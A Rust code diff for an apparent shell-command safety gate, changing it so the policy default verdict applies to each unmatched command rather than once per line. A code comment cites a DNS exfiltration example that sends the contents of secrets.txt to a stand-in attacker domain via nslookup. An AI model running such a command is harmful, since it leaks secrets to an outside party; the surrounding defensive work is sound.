@@ -28,6 +28,18 @@ use crate::decision::{CommandSummary, Decision, Finding, Incomplete};
 use crate::normalize::{Cmd, Collector, Ctx};
 use crate::resolve::PathCache;
 
+/// A command that no rule spoke for, and so took the policy default.
+///
+/// Held until the end of the evaluation because whether it needs a finding of its
+/// own depends on whether any *other* command matched something.
+struct Defaulted {
+    program: Option<String>,
+    span: shellguard_parse::Span,
+    text: String,
+    wrap_depth: u8,
+    via: Option<&'static str>,
+}
+
 /// Per-thread evaluation state.
 ///
 /// Kept out of [`Gate`] so the gate itself is immutable and shareable, and so
@@ -149,6 +161,9 @@ impl Gate {
         let mut capabilities: Vec<Capability> = Vec::new();
         let mut commands: Vec<CommandSummary> = Vec::new();
         let mut matched_any = false;
+        let mut executed_any = false;
+        // Commands that ran no rule's gauntlet and so took the policy default.
+        let mut defaulted: Vec<Defaulted> = Vec::new();
         let mut incomplete = None;
 
         for cmd in &cmds {
@@ -196,8 +211,23 @@ impl Gate {
             };
             policy.evaluate(&facts, &mut w.scratch, &mut w.hits);
 
+            executed_any |= cmd.executes();
             if !w.hits.is_empty() {
                 matched_any = true;
+            } else if cmd.executes() && !cmd.wrapper {
+                // The default applies to each command that nothing spoke for,
+                // not once for the whole line. Applied globally it was defeated
+                // by a neighbour: `totally-unknown-tool; ls` matched `ls`'s allow
+                // rule, so the unknown tool was never asked, and `nslookup
+                // $(cat secrets.txt).attacker.example` came back `allow`.
+                verdict = verdict.join(policy.default_verdict());
+                defaulted.push(Defaulted {
+                    program: cmd.program.clone(),
+                    span: cmd.span,
+                    text: cmd.text.clone(),
+                    wrap_depth: cmd.wrap_depth,
+                    via: cmd.via,
+                });
             }
             for hit in w.hits.drain(..) {
                 verdict = verdict.join(hit.verdict);
@@ -220,10 +250,32 @@ impl Gate {
             }
         }
 
-        // No rule had anything to say. That is not evidence of safety, so the
-        // policy's declared default applies rather than an implicit allow.
-        if !matched_any {
+        // Nothing spoke, and nothing was even asked. A line with nothing in it that
+        // executes — empty, or only assignments — and no rule that fired has had no
+        // command put to the per-command default above, so it takes the policy
+        // default here: silence is not evidence of safety.
+        if !matched_any && !executed_any {
             verdict = verdict.join(policy.default_verdict());
+        }
+
+        // When some *other* command did match, the verdict raised by the default
+        // would otherwise have no finding to explain it, and the first line of a
+        // report is supposed to be the reason. (When nothing matched at all the
+        // absence of findings already reads as "the default applied".)
+        if matched_any {
+            for d in defaulted {
+                findings.push(Finding {
+                    rule_id: "policy.default".to_string(),
+                    verdict: policy.default_verdict(),
+                    reason: "no rule matched this command; the policy default applies".to_string(),
+                    program: d.program,
+                    span: d.span,
+                    excerpt: d.text,
+                    wrap_depth: d.wrap_depth,
+                    via: d.via,
+                    caps: Vec::new(),
+                });
+            }
         }
 
         if incomplete.is_none() && unwrap_truncated {
